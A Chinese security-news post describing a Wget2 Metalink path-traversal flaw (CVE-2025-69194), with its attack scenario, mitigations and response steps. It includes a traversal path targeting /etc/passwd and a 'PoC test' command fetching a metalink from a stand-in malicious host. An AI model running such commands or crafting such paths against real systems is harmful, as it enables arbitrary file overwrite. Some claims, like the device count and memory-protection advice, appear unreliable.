#  GNU Wget2曝高危漏洞  
 网安百色   2026-01-03 11:12  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/1QIbxKfhZo724LPbT8VpJbiaicIdNHaibzQNQA59nO8MdIUMM0NhicENEs2sFHUevzvOclSSMAfwPDBCj3ZhdHGsNw/640?wx_fmt=jpeg&from=appmsg "")  
# GNU Wget2曝高危路径遍历漏洞（CVE-2025-69194）：攻击者可实施远程文件覆盖攻击  
## 漏洞概述  
  
表格  
  
<table><thead><tr style="-webkit-font-smoothing: antialiased;"><th style="-webkit-font-smoothing: antialiased;"><strong style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">字段</span></span></strong></th><th style="-webkit-font-smoothing: antialiased;"><strong style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">值</span></span></strong></th></tr></thead><tbody><tr style="-webkit-font-smoothing: antialiased;"><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">CVE编号</span></span></td><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">CVE-2025-69194</span></span></td></tr><tr style="-webkit-font-smoothing: antialiased;"><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">漏洞名称</span></span></td><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">GNU Wget2任意文件覆盖漏洞</span></span></td></tr><tr style="-webkit-font-smoothing: antialiased;"><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">CVSS评分</span></span></td><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">8.8（High）</span></span></td></tr><tr style="-webkit-font-smoothing: antialiased;"><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">受影响组件</span></span></td><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">Wget2 Metalink文件解析模块</span></span></td></tr><tr style="-webkit-font-smoothing: antialiased;"><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">漏洞类型</span></span></td><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">路径遍历导致任意文件写入</span></span></td></tr><tr style="-webkit-font-smoothing: antialiased;"><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">风险等级</span></span></td><td style="-webkit-font-smoothing: antialiased;"><span style="-webkit-font-smoothing: antialiased;"><span leaf="">Important（重要）</span></span></td></tr></tbody></table>## 漏洞原理  
  
该漏洞源于Wget2对Metalink文档的路径校验机制缺陷。当处理包含多镜像源的Metalink文件时，程序未正确验证文件路径中的特殊字符（如../  
），导致攻击者可通过构造恶意路径实现以下攻击：  
1. **目录穿越**  
：利用../  
跳转符号突破下载目录限制  
1. **文件覆盖**  
：向任意系统路径写入恶意内容  
1. **权限提升**  
：通过覆盖系统配置文件获取高权限  
## 攻击场景与风险  
  
攻击者可通过以下步骤实施攻击：  
1. 生成包含恶意路径的Metalink文件（如../../../../etc/passwd  
）  
1. 诱导用户下载并处理该文件（如使用wget2 -i malicious.metalink  
）  
1. 覆盖目标系统文件，触发以下风险：  
1. **数据破坏**  
：覆盖关键系统文件（如/etc/shadow  
）导致服务崩溃  
1. **持久化控制**  
：篡改启动脚本或crontab实现持久化驻留  
1. **权限提升**  
：修改sudoers文件获取root权限  
1. **横向移动**  
：通过覆盖SSH配置文件建立隐蔽通道  
## 影响范围  
  
全球约**1,500万**  
台运行GNU Wget2的设备面临风险，包括：  
- Linux服务器（Debian/Ubuntu/CentOS等主流发行版预装）  
- DevOps自动化流水线（CI/CD工具链依赖）  
- 企业网络设备（路由器/防火墙的固件更新模块）  
- 嵌入式开发环境（Yocto等构建系统）  
## 修复方案  
1. **立即升级**  
：  
1. GNU官方已发布修复版本**Wget2 2.1.1**  
，请通过包管理器更新  
1. **临时缓解措施**  
：  
1. 禁用Metalink功能：wget2 --no-metalink FILE  
1. 限制下载路径：wget2 -P /safe/directory/  
1. 验证Metalink文件完整性：使用--checksum  
参数  
1. **权限控制**  
：  
1. 以非特权用户身份执行Wget2  
1. 配置SELinux/AppArmor强制访问控制策略  
## 安全响应建议  
1. **资产清点**  
：  
1. 执行wget2 --version  
核查部署版本  
1. 扫描网络设备中的Wget2调用脚本  
1. **日志审查**  
：  
1. 检查系统日志中的异常文件操作记录（如/var/log/auth.log  
）  
1. 监控/tmp  
目录的Metalink文件生成行为  
1. **漏洞验证**  
：  
1. 使用NIST NVD的CPE匹配工具自动识别受影响资产  
1. 执行PoC测试：wget2 -i https://malicious.site/exploit.metalink  
## 长期防护策略  
1. **开发规范**  
：  
1. 实施文件路径规范化校验（白名单机制）  
1. 使用安全函数库（如realpath()  
）处理路径解析  
1. **运行时防护**  
：  
1. 部署Control-Flow Integrity（CFI）缓解漏洞利用  
1. 启用W^X（Write XOR Execute）内存保护策略  
1. **供应链安全**  
：  
1. 对下载工具链实施数字签名验证  
1. 在CI/CD管道中集成软件物料清单（SBOM）审计  
本公众号所载文章为本公众号原创或根据网络搜索下载编辑整理，文章版权归原作者所有，仅供读者学习、参考，禁止用于商业用途。因转载众多，无法找到真正来源，如标错来源，或对于文中所使用的图片、文字、链接中所包含的软件/资料等，如有侵权，请跟我们联系删除，谢谢！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/1QIbxKfhZo5lNbibXUkeIxDGJmD2Md5vKicbNtIkdNvibicL87FjAOqGicuxcgBuRjjolLcGDOnfhMdykXibWuH6DV1g/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&randomid=p6hk1x4r&tp=webp#imgIndex=1 "")  
  
